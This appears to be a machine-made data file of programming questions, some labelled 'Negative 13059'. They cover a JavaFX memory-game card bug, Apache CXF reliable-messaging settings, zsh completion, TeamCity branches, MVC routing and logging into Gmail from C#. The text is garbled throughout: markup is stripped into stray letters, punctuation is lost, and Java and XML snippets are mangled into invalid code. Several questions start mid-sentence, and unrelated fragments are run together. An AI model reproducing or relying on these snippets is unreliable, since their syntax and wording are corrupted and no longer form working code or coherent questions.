Negative 13059 h2EDIT h2  pA MCVE version of my code has been made to help debug it. It reproduces my bug. The purpose of my code is doing a Memory game. Which means that when it is your turn, you open a card, then another one. If they form a pair, they dont get turned over, they stay open. Otherwise, you turn them back over and try to find a pair on the next turn.p  pSimply put, the bug is  when you are opening the second card of your turn and both cards dont form a pair, the second one never gets openedp  pHopefully, this version of my code will help you to find the bug, which will help me a lotp  pI have put the code on Github  a hrefhttpsgist.github.comanonymouse866671d80384ae53b53 relnofollowhttpsgist.github.comanonymouse866671d80384ae53b53a And you will find it emattachedem at the end of the questionp  hr  h2Explanation of the issueh2  pI am having fun on doing a little Memory game in JavaFX and I came across this strange behavior where the card I click on represented by a custom class that extends the Button class never changes the image displayed.p  pNormally, when I click on the card, it opens itself by changing the graphic it displays. The strange and annoying thing is that it only happens in a specific case.p  pThe behavior of my card is correct when I open the first card of the turn of the player. It also works when I open a second one and both cards are a pair. Sadly, it doesnt work only in the case where I want to open a second card and it doesnt match as a pair with the first one.p  pI modified the Button class by adding codeopenCardcode and codecloseCardcode methods. Those methods will set a specific graphic on the buttoncard.p  pI will now show some code but it is hard to tell what might be the part that is making this behavior happen. Even more so that I am using Eclipse but cant possibly figure out how to debug a JavaFX app with breakpoints I am using console prints because the app will eventually crash when I reach my breakpoints and start crawling through the lines of code.p  hr  h2The codeh2  pFirstly, the modified Button class p  precodepublic class Card extends Button private String cardDesign  public Cardint row, int column   this.setGraphicnew ImageViewresourcescardback.png   this.setBackgroundnew Backgroundnew BackgroundFillColor.SLATEGRAY,       new CornerRadii6, null   public void setOpenCardDesignString design cardDesign  design   public void openCard this.setGraphicnew ImageViewcardDesign   public void closeCard   this.setGraphicnew ImageViewresourcescardback.png  codepre  pp  pNow the controller class, the event is set on a codeMouseEventcode. There is more code in this controller like checking if there is a pair, but this isnt an issue here I think as the problem is already at the line where I call the method to open the card. I use the  codegetSourcecode method here because my cards are arranged in a gridPane and I need to know which one has been clicked on.p  precodeOverride public void handleMouseEvent event    Get the card that was clicked on   Card card  Card event.getSource   Open the card   card.openCard   Do some more after this... codepre  pp  hr  pThats pretty much it as from what I could figure out.p  pAs already stated, I tried to check if the method codeopenCardcode is being called. It is as some comment printed in my console showed up. I even added some console printing just before and just after the line where I set the graphic and they both are showing up. I cant know for sure what happens when my app reaches the codesetGraphiccode line as nothing is showing up in my app the card remains closed.p  pAny hint would help because I am slowly sinking in madness right now.

The codeUsercode object is almost always the entity class. We would end up with lines likep  precodeGenericLoginltABC01REGISTEREDUSERgt.Current.User codepre  pThis is what I want to prevent.

Every change of any pulldown menus should reload the list  based on the updated filters.   For example, users may first choose to see the plumber jobs in California AND posted Within one week.  If there were not much shown, Users can unselect post date and see the plumber jobs from California instead, or vise versa.   p  pMy question is which codelanguage is a good choice to carry out such functions  PHP Javascript or something else It would be better if you provide some examples for me to learn and digest, because I dont have much experience on this topic.      p

Which all APIs have implemented this pattern and under what all use case. p  pOne of the use case which strikes me immediately is the DI of objects which need to be created using run time information.p  pI have the understanding that this pattern is used to create object of various product families. But for every new product family we have to change the existing factories. Also if there is an addition implementation of any product family we have to provide a new factory for this new implementation.p  pFor example p  pI have products Frame and TextBox for two types of OS  Windows and MAC. Now we will have two factories one for each Window and Mac so that WindowFactory returns textbox and frame for Windows and MacFactory return the same objects for MAC. Now say I want to add another OS say Solar then in this case I need to write a new factory which returns the corresponding objects for solar.p  pHow API use this patterns in real worldp

Each iteration enters the loop as a 1x1 matrix from a 1x6 array, but the for loop wants to shoehorn the 2x1 answer into the 1x1 allocated space. p  pIve researched cells and structures but to no avail could I get them to work. The equation works if take the for loop off and just solve for each function individually, but the goal is to scale this for loop up to churn through a lot more than just a 1x6 array.

Negative 13059 pI am currently using cxf 2.7.10 and camel to setup a webservice calling route and also some webservice endpoints that are provided to be called from the outside.p  pAll is working fine when WSReliableMessaging is turned off for example by commenting out the policy parts that declare it in WSDL, so generally it works.p  pNow when i want to enable WSRM again, the Interceptors for it are loaded fine and and the WSReliablMessaging CreateSequence is sent out fine as expected.p  pThe real problem now is, that the receiver using weblogic is not accepting the Offer that is also automatically sent. Also the Expires that is sent PT0S is not accepted.p  pIs there a way to remove the sending of the Offer and the Expires, or remove the Offer and change the Expires to a different durationp  pthis was in our camelcontext before, and it worked with and without enabled policy in the WSDLp  precodeltcxfbusgt  ltcxffeaturesgt   ltcxflogging gt  ltcxffeaturesgt ltcxfbusgt codepre  pand this is what i triedp  precodeltcxfbusgt  ltcxffeaturesgt   ltcxflogging gt   ltwsaaddressing gt   ltwsrmmgrreliableMessaginggt    ltwsrmmgrsourcePolicy includeOfferfalse sequenceExpiration  PT12Hgt   ltwsrmmgrreliableMessaginggt  ltcxffeaturesgt ltcxfbusgt codepre  pthis did not work as it wasnt adding the wsaddressing headers, but the message atleast was send out so removing the Offer and changing the Expires workedp  pthe 2nd idea was having the old cxfbus config and adding thisp  precodeltwsrmmgrrmManager xmlnswsrmmgrhttpcxf.apache.orgwsrmmanagergt  ltwsrmmgrsourcePolicy includeOfferfalse sequenceExpiration  PT12Hgt ltwsrmmgrrmManagergt codepre  pthis also seemed to remove the Offer and changed the Expires but the message was not sent out, i only received an INFO log entry Sending outofband RM Protocoll Message.p  pso is there a way to remove the Offer and change the Expires without changing something in the bus, because now it seems like the other webservices that are also using the same bus are also then using WSRM when per WSDL they should not.p  pI was thinking if it might be possible that there is a way to setup an interceptor to set the WS RM Manager accordingly or to set the values for Offer and Expires there.p  pFor example when changing the commenting out the policy in WSDL to remove WSRM and then rebuilding the jars got too much hassle, i added an interceptor that sets PolicyConstants.POLICYOVERRIDE to an empty Policy, so the WSRM Interceptors would not kick in automaticly and WSRM could be turned on and off from the outside just using a properties entry and restarting. Perhaps something like this works with the Offer and Expiresp  pI hope it wasnt too much text and i could explain my problem to you, maybe someone with more cxf knowledge has an idea. p

Negative 13059 pIve been digging for this for quite some time.  I see that there are a lot of these autogrowing  autoexpanding  autoresizing textbox textarea plugins around.

The 2 points Id like to achieve are explained belowp  ol lipAssume I have a textarea, and its smaller than my screen.  If you keep adding text and lines to the text area, it should expand automatically from the bottom of the textarea.  It will continue to expand the bottom until it touches the bottom of my viewport.  Then, if I still keep adding text, it will start expanding the top, until it touches the top of my viewport, before it starts allowing you to scroll within the textarea.p  pWords are hard to explain, lets look at the video herebr a hrefhttpbeamstyle.com.hkdownloadgmailreply1.mp4 relnofollowhttpbeamstyle.com.hkdownloadgmailreply1.mp4apli lipAssume there is a situation where you have a page with some text, a textarea below which has enough text to make it have a scrollbar, then below the textarea, another blurb of text.p  pThen, lets imagine, you start scrolling from the very top until the very bottom.  The textarea will come into the screen from the bottom, it will be sticky to the bottom, and then sticky to the top, and then finally leave the screen.p  pWords are hard to explain, lets look at the video herebr a hrefhttpbeamstyle.com.hkdownloadgmailreply2.mp4 relnofollowhttpbeamstyle.com.hkdownloadgmailreply2.mp4apli ol

Negative 13059 pIm trying to figure out how to get file completion to work at any codewordcode position on the command line after a set of characters. As listed in a shell these characters would be code[     ]code the whitespace is tab and space. Zsh will do this, but only after the backtick character, , or codecode. mksh does this except not after the characters code[]code.p  pBy word position on the command line, Im talking about each set of characters you type out which are delimited by space and a few other characters. For example,p  pcodeprint Hello Worldcode,p  phas three codewordscode at positions 13. At position 1, when youre first typing stuff in, completion is pretty much perfect. File completion works after all of the characters I mentioned. After the first codewordcode, the completion system gets more limited since its smart. This is useful for commands, but limiting where you can do file completion isnt particularly helpful.p  pHere are some examples of where file completion doesnt work for me but should in my opinionp  pcode a...codep  pcodeecho a...codep  pcodemake LDFLAGSnostdlib ...crt1.o ...crti.o ...codep  pcodeenv a... b... ...codep  pIve looked at rebinding codeIcode tab with the handful of different completion widgets Zsh comes with and changing my codezstyle completioncode lines. Nothing has worked so far to change this default Zsh behaviour. Im thinking I need to create a completion function that I can add to the end of my codezstyle completion completer ...code line as a last resort completion.p  pIn the completion function, one route would be to cut out the current codewordcode I want to complete, complete it, and then reinsert the completion back into the line if thats possible. It could also be more like codeprecommandcode which shifts the second codewordcode to the first codewordcode so that normal command completion works.p  pI was able to modify codeprecommandcode so that you can complete commands at any codewordcode position. This is the new file, I named it codecommandocode and added its directory to my fpathp  precodecompdef                                                                  precommands is made local in maincomplete precommandswords[1, CURRENT 1 ]  shift words CURRENT1  normal codepre  pTo use it I added it to the end of my codecompletion completer ...code line in my zshrc so it works with every program in codepathcode. Basically whatever codewordcode youre typing in is considered the first codewordcode, so command completion works at every codewordcode position on the command line.p  pIm trying to figure out a way to do the same thing for file completion, but it looks a little more complicated at first glace. Im not really sure where to go with this, so Im looking to get some help on this.p
Negative 13059 pWe had some success using the branches concept of TeamCity in subversion by pointing to codetagscode like mentioned here a hrefhttpstackoverflow.coma68751512416394httpstackoverflow.coma68751512416394a although we are aware that this is primary for codeDVCScode like git.p  pWeve extended the answer from the link by providing a project parameter codeTagcode which became part of the checkout rule. So our SVN Root is codehttpmyserversvntagscode and the checkout rule is  codeTaggt.code Each time we checkout a new tag is added as branch and build the source, this is finep  pNow we started experimenting with chained builds.  Lets say I have those configsp  ul liSource Buildli liInstallerLiteli liInstallerFullli ul  pBoth Installers need source, both have it as snapshot and artifact dependency. The main problem is codeTagcode is a mandatory parameter for Source Build but not for the other, I dont want to replicate all properties to each config. So whenever I trigger any installer, source gets build with codeTagcode set to empty. p  pWhich then results in building codehttpmyserversvntagsTagcode with an empty tag. This checks out all tags in the Default branch in one workspace which later fails to build as the structure is different and anyway way to large.p
Negative 13059 pA design goal for a website Im working on is to keep the URL in the browser in a state where the user can copy it, and the link can be used from another browserusermachine to return to the spot that the url was copied.

E.G.  User has both customer1234566 and customer333552 in two side by side columnsp  pIn a perfect world, Id like the url to be customer1234566customer333552 for the above scenario, but I dont know if MVC routing can handle repetitive patterns, or, if so, how it is done.p  pCan this be done via routing  If not is there a way to get this type of oneormore functionality from Urlp

Negative 13059 pI understood how to login to Gmail using c, but when I try to go to the webpage it does not recognize I have logged in to Gmail.p  pOverall, I need to login to Gmail, and then access a webpage once Im logged in, and save its source code, all using c, preferably without having to open a browser, just doing all within the c application.p  pEdit I have logged in to Gmail successfully.
